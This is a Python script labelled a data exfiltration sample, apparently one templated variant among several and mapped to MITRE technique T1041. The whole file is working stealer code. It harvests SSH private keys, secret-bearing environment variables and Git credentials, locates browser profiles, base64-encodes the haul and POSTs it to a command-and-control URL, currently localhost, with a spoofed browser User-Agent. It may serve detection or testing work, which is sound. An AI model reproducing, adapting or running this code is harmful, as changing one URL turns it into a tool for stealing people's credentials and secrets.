# Variation: 8
# Data Exfiltration Sample - Template v2.0
# Language: Python
# Attack Type: Data Exfiltration
# MITRE ATT&CK: T1041 (Exfiltration Over C2 Channel)

import os
import sys
import base64
import json
from pathlib import Path

def collect_sensitive_data():
    """收集敏感数据"""
    data = {
        'system_info': {},
        'files': [],
        'credentials': [],
        'environment': {}
    }
    
    # 系统信息
    data['system_info'] = {
        'platform': sys.platform,
        'python_version': sys.version,
        'hostname': os.uname().nodename if hasattr(os, 'uname') else 'unknown',
        'user': os.environ.get('USER', 'unknown'),
        'home': os.path.expanduser('~'),
    }
    
    # 收集 SSH 密钥
    ssh_dir = Path(os.path.expanduser("~/.ssh"))
    if ssh_dir.exists():
        for key_file in ssh_dir.glob('*'):
            if key_file.is_file() and not key_file.suffix:
                try:
                    content = key_file.read_text()
                    data['credentials'].append({
                        'type': 'ssh_key',
                        'file': str(key_file),
                        'content_preview': content[:100] + '...'
                    })
                except Exception:
                    pass
    
    # 收集环境变量
    sensitive_patterns = ['KEY', 'SECRET', 'PASSWORD', 'TOKEN', 'CREDENTIAL']
    for key, value in os.environ.items():
        if any(pattern in key for pattern in sensitive_patterns):
            data['environment'][key] = value
    
    # 收集浏览器数据
    browser_paths = {
        'chrome': Path.home() / '.config' / 'google-chrome' / 'Default',
        'firefox': Path.home() / '.mozilla' / 'firefox',
        'chromium': Path.home() / '.config' / 'chromium',
    }
    
    for browser, path in browser_paths.items():
        if path.exists():
            data['files'].append({
                'type': 'browser_data',
                'browser': browser,
                'path': str(path),
                'exists': True
            })
    
    # 收集 Git 凭据
    git_credentials = Path.home() / '.git-credentials'
    if git_credentials.exists():
        try:
            content = git_credentials.read_text()
            data['credentials'].append({
                'type': 'git_credentials',
                'file': str(git_credentials),
                'content_preview': content[:200] + '...'
            })
        except Exception:
            pass
    
    return data

def encode_data(data):
    """编码数据"""
    json_str = json.dumps(data, indent=2)
    encoded = base64.b64encode(json_str.encode()).decode()
    return encoded

def exfiltrate_data(data, c2_url):
    """外传数据到 C2 服务器"""
    try:
        import requests
        
        # 编码
        encoded_data = encode_data(data)
        
        # 发送
        response = requests.post(
            c2_url,
            json={
                'data': encoded_data,
                'type': 'exfiltration',
                'version': '2.0'
            },
            timeout=10,
            headers={'User-Agent': 'Mozilla/5.0'}
        )
        
        return response.status_code == 200
        
    except ImportError:
        # 回退到 urllib
        try:
            import urllib.request
            import urllib.error
            
            encoded_data = encode_data(data)
            payload = json.dumps({'data': encoded_data}).encode()
            
            req = urllib.request.Request(
                c2_url,
                data=payload,
                headers={'Content-Type': 'application/json'}
            )
            
            response = urllib.request.urlopen(req, timeout=10)
            return response.status == 200
            
        except Exception as e:
            print(f"Exfiltration failed: {e}")
            return False
    
    except Exception as e:
        print(f"Exfiltration failed: {e}")
        return False

def save_locally(data, output_path):
    """本地保存 (测试用)"""
    output_file = Path(output_path)
    output_file.parent.mkdir(parents=True, exist_ok=True)
    
    with open(output_file, 'w') as f:
        json.dump(data, f, indent=2)
    
    return output_file

def main():
    """主函数"""
    # C2 服务器 URL (示例)
    C2_URL = "http://127.0.0.1:8080/collect"
    
    # 本地输出 (测试用)
    OUTPUT_PATH = "output/exfiltrated_data.json"
    
    print("=" * 60)
    print("Data Exfiltration Sample v2.0")
    print("=" * 60)
    print()
    
    # 收集数据
    print("[*] Collecting sensitive data...")
    sensitive_data = collect_sensitive_data()
    
    print(f"    ✓ System info collected")
    print(f"    ✓ Found {len(sensitive_data['credentials'])} credential files")
    print(f"    ✓ Found {len(sensitive_data['files'])} browser data paths")
    print(f"    ✓ Found {len(sensitive_data['environment'])} sensitive env vars")
    print()
    
    # 本地保存 (演示)
    print(f"[*] Saving to local file: {OUTPUT_PATH}")
    saved_file = save_locally(sensitive_data, OUTPUT_PATH)
    print(f"    ✓ Saved to {saved_file}")
    print()
    
    # 外传 (可选)
    print(f"[*] Attempting to exfiltrate to C2: {C2_URL}")
    if exfiltrate_data(sensitive_data, C2_URL):
        print("    ✓ Data exfiltrated successfully")
    else:
        print("    ✗ Exfiltration failed (expected in test environment)")
    
    print()
    print("=" * 60)
    print("Exfiltration complete!")
    print("=" * 60)

if __name__ == '__main__':
    main()
